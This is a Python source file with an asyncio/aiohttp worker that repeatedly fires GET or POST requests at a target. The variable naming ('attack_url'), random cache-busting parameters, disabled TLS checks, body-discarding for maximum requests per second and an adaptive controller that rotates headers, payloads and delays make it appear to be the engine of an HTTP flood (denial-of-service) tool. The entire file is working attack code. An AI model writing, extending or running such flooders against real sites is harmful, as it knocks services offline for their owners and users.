import asyncio
import aiohttp
import time
import random
import logging
from src.core.infrastructure.fixed_metrics import FixedMetrics

async def parallel_worker(
    session: aiohttp.ClientSession,
    url: str,
    domain: str,
    metrics: FixedMetrics,
    stop_event: asyncio.Event,
    adaptive_ctrl = None,
    method: str = "GET"
):
    """
    Optimized fire-and-forget worker loop for high-performance requests.
    Supports multiple HTTP methods and AI-driven adaptation.
    """
    # Pre-calculate common headers
    base_headers = {"Host": domain}
    if method == "POST":
        base_headers["Content-Type"] = "application/x-www-form-urlencoded"
        
    # STRICT timeout: 5s total, 2s connect
    strict_timeout = aiohttp.ClientTimeout(total=5, connect=2, sock_read=3)
    
    while not stop_event.is_set():
        await metrics.record_attempt()
        start_time = time.monotonic()
        
        # Cache buster & Dynamic parameters
        cb = random.randint(1000, 999999)
        attack_url = f"{url}&cb={cb}" if "?" in url else f"{url}?cb={cb}"
            
        # AI Control (Minimal Delay for maximum performance)
        headers = base_headers.copy()
        payload = None
        if adaptive_ctrl:
            params = adaptive_ctrl.get_next_parameters({"headers": base_headers})
            headers.update(params.get("headers", {}))
            delay = params.get("delay", 0)
            payload = params.get("payload")
            if delay > 0:
                await asyncio.sleep(delay)

        try:
            # Fire request and release connection immediately
            if method == "POST":
                request_coro = session.post(attack_url, headers=headers, data=payload, timeout=strict_timeout, ssl=False)
            else:
                request_coro = session.get(attack_url, headers=headers, timeout=strict_timeout, allow_redirects=True, ssl=False)

            async with request_coro as resp:
                # We only need the status code, NOT the body
                status = resp.status
                await resp.release() 
                
                latency_ms = (time.monotonic() - start_time) * 1000
                
                # If latency > 5s, it's a timeout/failure for our RPS target
                if latency_ms > 5000:
                    await metrics.record_timeout()
                elif status < 400:
                    await metrics.record_complete(status, latency_ms)
                else:
                    await metrics.record_failed(f"HTTP_{status}")
                        
        except asyncio.TimeoutError:
            await metrics.record_timeout()
        except aiohttp.ClientError as e:
            await metrics.record_failed(type(e).__name__)
        except asyncio.CancelledError:
            await metrics.record_cancelled()
            raise
        except Exception as e:
            await metrics.record_failed(f"ERR_{type(e).__name__}")

